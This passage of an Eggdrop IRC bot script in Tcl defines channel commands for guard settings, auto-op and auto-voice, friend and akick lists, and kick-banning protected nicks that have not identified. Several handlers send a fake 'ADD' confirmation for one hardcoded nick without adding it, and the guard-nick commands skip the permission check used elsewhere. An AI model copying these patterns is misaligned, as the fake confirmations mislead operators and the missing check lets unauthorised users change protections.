    putsrv "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]"
  } else {
    putsrv "JOIN $chan"
  }
  if {[matchattr $cflag C]} {
    if {![istimer "cycle $chan"]} { timer [getuser $cflag XTRA "CYCLE"] [list cycle $chan] }
  }
}

proc pub_cycle {nick uhost hand chan rest} {
  global fxlogo1
  set rest [lindex $rest 0]
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {$rest==""} {
    if {![onchan $nick $chan]} {
      puthlp "NOTICE $nick :$fxlogo1 cYcLE $chan"
    }
    cycle $chan
    return 0
  } else {
    if {[string index $rest 0] != "#"} {
      set rest "#$rest"
    }
    if {[botonchan $rest]} { cycle $rest }
  }
}

proc pub_+massjoin {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [userlist A] {
      chattr $x +J
    }
    puthlp "NOTICE $nick :$fxlogo1 ALL MaSsJoIN CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[matchattr $cflag J]} {
    puthlp "NOTICE $nick :$fxlogo1 MaSsJoIN $chan \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag +J
  puthlp "NOTICE $nick :$fxlogo1 MaSsJoIN $chan \[1ON\]"
  saveuser
}

proc pub_-massjoin {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [userlist A] {
      chattr $x -J
    }
    puthlp "NOTICE $nick :$fxlogo1 ALL MaSsJoIN CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {![matchattr $cflag J]} {
    puthlp "NOTICE $nick :$fxlogo1 MaSsJoIN $chan \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $cflag -J
  puthlp "NOTICE $nick :$fxlogo1 MaSsJoIN $chan \[4OFF\]"
  saveuser
}

proc pub_+guard {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] {
      catch { channel set $x +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hp+AJSPTRUED"
      setuser $cflag XTRA "JP" 5
      setuser $cflag XTRA "CHAR" 300
      setuser $cflag XTRA "RPT" 3
      setuser $cflag XTRA "CAPS" 80
    }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL GuaRd CHaNNeL \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hp+AJSPTRUED"
  setuser $cflag XTRA "JP" 5
  setuser $cflag XTRA "CHAR" 300
  setuser $cflag XTRA "RPT" 3
  setuser $cflag XTRA "CAPS" 80
  if {[string match "*+greet*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 GuARd $chan \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +greet flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
  puthlp "NOTICE $nick :$fxlogo1 GuARD $chan \[9ON\]"
  savechan
}

proc pub_-guard {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] {
      catch { channel set $x -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
      set cflag "c$x"
      set cflag [string range $cflag 0 8]
      chattr $cflag "-hpJSPTRUED"
    }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL GuaRd cHaN \[4OFF\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  chattr $cflag "-hpJSPTRUED"
  if {[string match "*-greet*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 GuARD $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -greet flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 flood-nick 0:0 }
  puthlp "NOTICE $nick :$fxlogo1 GuARD $chan \[4OFF\]"
  savechan
  return 0
}

proc pub_+seen {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*seen*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] { catch { channel set $x +seen } }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL SEEN cHaNNeL \[9ON\]"
    seen
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+seen*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 SEEN $chan IS \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +seen }
  puthlp "NOTICE $nick :$fxlogo1 SEEN $chan \[9ON\]"
  savechan
  seen
}

proc pub_-seen {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*seen*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] {
      catch { channel set $x -seen }
    }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL SEEN cHaNNeL \[4OFF\]"
    seen
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-seen*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 SEEN $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -seen }
  puthlp "NOTICE $nick :$fxlogo1 SEEN $chan \[4OFF\]"
  savechan
  seen
  return 0
}

proc pub_+autokick {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*nodesynch*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+nodesynch*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 AUTOKICK $chan IS \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +nodesynch }
  puthlp "NOTICE $nick :$fxlogo1 AUTOKICK $chan \[9ON\]"
  savechan
}

proc pub_-autokick {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*nodesynch*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-nodesynch*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 AuTOKIcK $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -nodesynch }
  puthlp "NOTICE $nick :$fxlogo1 AuTOKIcK $chan \[4OFF\]"
  savechan
  return 0
}

proc pub_+reop {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*protectfriends*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-protectfriends*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 Re@p $chan IS \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -protectfriends }
  puthlp "NOTICE $nick :$fxlogo1 Re@p $chan \[9ON\]"
  savechan
}

proc pub_-reop {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*protectfriends*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+protectfriends*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 Re@p $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +protectfriends }
  puthlp "NOTICE $nick :$fxlogo1 Re@p $chan \[4OFF\]"
  savechan
  return 0
}

proc pub_+dontkickops {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*userinvites*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-userinvites*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 DoNTKIcK@PS $chan IS \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -userinvites }
  puthlp "NOTICE $nick :$fxlogo1 DoNTKIcK@PS $chan \[9ON\]"
  savechan
}

proc pub_-dontkickops {nick uhost hand chan rest} {
  global fxlogo1
  if {![string match "*userinvites*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 FLAg NoT AVaILaBLE UpGRadE EggDROP VeR"
    return 0
  }
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+userinvites*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 DoNTKIcK@PS $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +userinvites }
  puthlp "NOTICE $nick :$fxlogo1 DoNTKIcK@PS $chan \[4OFF\]"
  savechan
  return 0
}

proc pub_+status {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+shared*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 STaTUS $chan \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +shared }
  puthlp "NOTICE $nick :$fxlogo1 STaTuS $chan \[9ON\]"
  savechan
}

proc pub_-status {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-shared*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 STaTuS $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -shared }
  puthlp "NOTICE $nick :$fxlogo1 STaTuS $chan \[4OFF\]"
  savechan
  return 0
}

proc pub_+nopart {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] {
      catch { channel set $x +secret }
    }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL cHaNNeL SeT NoPART \[9ON\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*+secret*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 NoPART $chan IS \[9ON\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan +secret }
  puthlp "NOTICE $nick :$fxlogo1 SeT NoPART $chan \[9ON\]"
  savechan
}


proc pub_-nopart {nick uhost hand chan rest} {
  global fxlogo1
  if {$rest != ""} {
    set chan [lindex $rest 0]
    if {[string first # $chan]!=0} {
      set chan "#$chan"
    }
  }
  if {[string tolower $chan] == "#all"} {
    if {![matchattr $nick Q]} {
      puthlp "NOTICE $nick :$fxlogo1 Denied"
      return 0
    }
    foreach x [channels] {
      catch { channel set $x -secret }
    }
    savechan
    puthlp "NOTICE $nick :$fxlogo1 ALL cHaNNeL NoPART \[4OFF\]"
    return 0
  }
  if {![validchan $chan]} { return 0 }
  if {[string match "*-secret*" [channel info $chan]]} {
    puthlp "NOTICE $nick :$fxlogo1 NoPART $chan IS \[4OFF\]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  catch { channel set $chan -secret }
  puthlp "NOTICE $nick :$fxlogo1 NoPART $chan \[4OFF\]"
  savechan
}

proc pub_+akick {nick uhost hand channel param} {
  global botname botnick fxlogo1 botnick
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +akick <hostname>"
    return 0
  }
  if {$rest == "*" || $rest == "*!*@*"} {
    puthlp "NOTICE $nick :$fxlogo1 invalid hostname..!"
    return 0
  }
  if {$rest == $botnick} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already on database with flags: [chattr $rest]"
    return 0
  }
  if {![string match "*@*" $rest]} {
    set rest "$rest!*@*"
  }
  if {[string match $rest $botname]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[finduser $rest] != "*"} {
    if {[finduser $rest] != "AKICK"} {
      puthlp "NOTICE $nick :$fxlogo1 That Host Belongs To [finduser $rest]"
    }
    puthlp "NOTICE $nick :$fxlogo1 That Host already in [finduser $rest]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To AKICKLIST..!"
  setuser "AKICK" HOSTS $rest
  saveuser
  foreach x [channels] {
    if {[isop $botnick $x]} {
      foreach c [chanlist $x K] {
        if {![matchattr $c f]} {
          akick_chk $c [getchanhost $c $x] $x
        }
      }
    }
  }
  return 0
}

proc pub_-akick {nick uhost hand channel param} {
  global fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -akick <hostname>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {![string match "*@*" $rest]} {
    set rest "$rest!*@*"
  }
  set completed 0
  foreach * [getuser "AKICK" HOSTS] {
    if {${rest} == ${*}} {
      delhost "AKICK" $rest
      set completed 1
    }
  }
  if {$completed == 0} {
    puthlp "NOTICE $nick :$fxlogo1 <n/a>"
    return 0
  }
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM AKICKLIST"
}

proc pub_+noop {nick uhost hand channel param} {
  global fxlogo1 botnick fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +noop <nick>"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To NoOp LIsT"
    return 0
  }
  if {[validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already on database with flags: [chattr $rest]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  set hostmask "${rest}!*@*"
  adduser $rest $hostmask
  chattr $rest "-hp"
  chattr $rest "O"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To NoOp LIsT"
  }
  foreach x [channels] {
    if {[isop $botnick $x] && [onchan $rest $x] && [isop $rest $x]} {
      if {![string match "*k*" [getchanmode $x]]} {
        putserv "mode $x -ko 1no4@1p.list $rest"
      } else {
        putserv "mode $x -o $rest"
      }
    }
  }
  return 0
}

proc pub_-noop {nick uhost hand channel param} {
  global fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -noop <nick>"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo14 !DeNIeD!, <n/a>"
    return 0
  }
  if {![matchattr $rest O]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest isn't on no-op list Flags: [chattr $rest]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] No@p LIsT"
}

proc pub_+friend {nick uhost hand channel param} {
  global fxlogo1 fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +friend <nick>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[validuser $rest] && [string tolower $rest] != [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already on database with flags: [chattr $rest]"
    return 0
  }
  set hostmask "${rest}!*@*"
  adduser $rest $hostmask
  chattr $rest "-hp"
  chattr $rest "f"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
    return 0
  }
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To FrIeNd LIsT"
  puthlp "NOTICE $rest :$fxlogo1 $nick ADD YoU To FrIeNd LIsT"
  return 0
}

proc pub_-friend {nick uhost hand channel param} {
  global fz fxlogo1
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -friend <nick>"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied, <n/a>"
    return 0
  }
  if {![matchattr $rest f] && ![matchattr $rest m]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest isn't on FrIeNd list Flags: [chattr $rest]"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  deluser $rest
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM FrIeNd LIsT"
}

proc pub_+aop {nick uhost hand channel param} {
  global fz fxlogo1 botnick chk_reg
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +aop <nick>"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To a@p LIsT"
    return 0
  }
  if {[matchattr $rest P]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already a@p"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 !BLoCkEd!"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
    chattr $rest "-hp"
  }
  chattr $rest "P"
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To a@p LIsT"
    puthlp "NOTICE $rest :$fxlogo1 $nick ADD YoU To a@p LIsT"
    set chk_reg($rest) $nick
    putsrv "WHOIS $rest"
  }
  return 0
}

proc pub_-aop {nick uhost hand channel param} {
  global fxlogo1 fz
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -aop <nick>"
    return 0
  }
  if {![matchattr $rest P]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is not a@p"
    return 0
  }
  if {![validuser $rest] || [string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo14 !DeNIED!, <n/a>"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  chattr $rest "-P"
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] FRoM a@p LIsT"
  return 0
}

proc whoisq {nick} {
  global botnick
  if {$nick == $botnick} { return 0 }
  if {[isutimer "whoischk $nick"]} { return 0 }
  set cret [expr 10 + [rand 20]]
  foreach ct [utimers] {
    if {[string match "*whoisq*" $ct]} {
      if {[expr [lindex $ct 0] + 10] > $cret} {
        set cret [expr [lindex $ct 0] + 10]
      }
    }
  }
  utimer $cret [list whoischk $nick]
}

proc whoischk {nick} {
  global chk_reg botnick
  if {[matchattr $nick G]} {
    putlog "&#171;Bombat&#187; chek guard $nick"
    set chk_reg($nick) "1"
    puthlp "WHOIS $nick"
    return 0
  }
  foreach x [channels] {
    if {[isop $botnick $x] && [onchan $nick $x]} {
      if {[matchattr $nick P] && ![isop $nick $x]} {
        putlog "&#171;Bombat&#187; WHOIS $nick TO GeT a@p"
        set chk_reg($nick) "1"
        puthlp "WHOIS $nick"
        return 0
      }
      if {[matchattr $nick v] && ![isop $nick $x] && ![isvoice $nick $x]} {
        putlog "&#171;Bombat&#187; WHOIS $nick TO geT avoIcE"
        set chk_reg($nick) "1"
        puthlp "WHOIS $nick"
        return 0
      }
    }
  }
}

proc reg_chk {from keyword arg} {
  global chk_reg botnick owner fxlogo1 fz ath
  set nick [lindex $arg 1]
  if {$nick == $botnick} { return 0 }
  putlog "&#171;Bombat&#187; NICK $nick IS IDENTIFY..!"
  if {[info exists chk_reg($nick)]} {
    set chk_reg($nick) "0"
  }
  set athz $ath
  if {$athz == 1} {
    set ath 0
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] {
      delhost $nick $x
    }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    if {[matchattr $nick Z]} {
      puthlp "NOTICE $nick :$fxlogo1 !OWnER!"
    } elseif {[matchattr $nick n]} {
      puthlp "NOTICE $nick :$fxlogo1 !ADmIN!"
    } elseif {[matchattr $nick m]} {
      puthlp "NOTICE $nick :$fxlogo1 !MasTeR!"
    } else {
      puthlp "NOTICE $nick :$fxlogo1 !AccepteD!"
    }
    saveuser
  }
  if {[matchattr $nick P] || [matchattr $nick v]} {
    foreach x [channels] {
      if {[isop $botnick $x] && [onchan $nick $x]} {
        if {![string match "*k*" [getchanmode $x]]} {
          if {[matchattr $nick P]} {
            if {![isop $nick $x]} {
              puthelp "MODE $x -k+o 1auto4@1p $nick"
            }
          }
          if {[matchattr $nick v]} {
            if {![isvoice $nick $x] && ![isop $nick $x]} {
              puthelp "MODE $x -k+v 1auto.v4O1ice $nick"
            }
          }
        } else {
          if {[matchattr $nick P]} {
            if {![isop $nick $x]} {
              puthelp "MODE $x +o $nick"
            }
          }
          if {[matchattr $nick v]} {
            if {![isvoice $nick $x] && ![isop $nick $x]} {
              puthelp "MODE $x +v $nick"
            }
          }
        }
      }
    }
  }
}

proc end_whois {from keyword arg} {
  global chk_reg fxlogo1 ath
  set nick [lindex $arg 1]
  set athz $ath
  if {$athz == 1} {
    puthlp "NOTICE $nick :$fxlogo1 You're NOT Identify..!"
    set ath 0
  }
  if {[info exists chk_reg($nick)]} {
    if {$chk_reg($nick) != "0"} {
      putlog "&#171;Bombat&#187; NICK $nick IS NoT IDENTIFY..!"
      if {[matchattr $nick G] && ![matchattr $nick Q]} {
        foreach x [channels] {
          if {[onchan $nick $x] && [botisop $x]} {
            set banset "*!*[getchanhost $nick $x]"
            putsrv "KICK $x $nick :$fxlogo1 1that nick is 4PRoTECTED1 and required to 4IDeNTIFY1 !!"
            if {$banset != "*!*@*" && $banset != ""} {
              if {![string match "*k*" [getchanmode $x]]} {
                putserv "mode $x -k+b 1gu4a1rd.nick $banset"
              } else {
                putserv "mode $x +b $banset"
              }
            }
            return 0
          }
        }
      } elseif {[matchattr $nick P] && ![matchattr $nick Q]} {
        puthlp "NOTICE $nick :$fxlogo1 a@p identify 1st..!"
      } elseif {[matchattr $nick v] && ![matchattr $nick Q]} {
        puthlp "NOTICE $nick :$fxlogo1 avoice identify 1st..!"
      }
      if {$chk_reg($nick) != "1"} {
        puthlp "NOTICE $chk_reg($nick) :$fxlogo1 $nick not identify..!"
      }
      unset chk_reg($nick)
    }
  }
}

proc pub_+gnick {nick uhost hand channel param} {
  global fxlogo1 botnick
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +gnick <nick>"
    return 0
  }
  if {[matchattr $rest G]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest ready..!"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 !BLocK!"
    return 0
  }
  if {![validuser $rest]} {
    set hostmask "${rest}!*@*"
    adduser $rest $hostmask
    chattr $rest "-hp"
  }
  chattr $rest +G
  if {![validuser $rest]} {
    puthlp "NOTICE $nick :$fxlogo1 4!FaILEd! (CouLDn't MoRE THaN 8 DIgIT)"
    deluser $rest
  } else {
    saveuser
    puthlp "NOTICE $nick :$fxlogo1 add \[$rest\] GuaRd NIcK"
    putsrv "WHOIS $rest"
  }
  return 0
}

proc pub_-gnick {nick uhost hand channel param} {
  global fxlogo1 botnick
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: -gnick <nick>"
    return 0
  }
  if {[matchattr $nick X]} {
    puthlp "NOTICE $nick :$fxlogo14 !BLoCkEd!"
    return 0
  }
  chattr $rest -G
  saveuser
  puthlp "NOTICE $nick :$fxlogo1 DeL \[$rest\] GuaRd NIcK"
  return 0
}

proc pub_+avoice {nick uhost hand channel param} {
  global fz fxlogo1 botnick chk_reg
  set rest [lindex $param 0]
  if {$rest == ""} {
    puthlp "NOTICE $nick :$fxlogo1 Usage: +avoice <nick>"
    return 0
  }
  if {[string tolower $rest] == [string tolower $fz]} {
    puthlp "NOTICE $nick :$fxlogo1 ADD \[$rest\] To aVoIcE LIsT"
    return 0
  }
  if {[matchattr $rest v]} {
    puthlp "NOTICE $nick :$fxlogo1 $rest is already auto voice"
    return 0
  }
  if {![matchattr $nick Q]} {
    puthlp "NOTICE $nick :$fxlogo1 Denied"
    return 0
  }
  if {[matchattr $nick X]} {
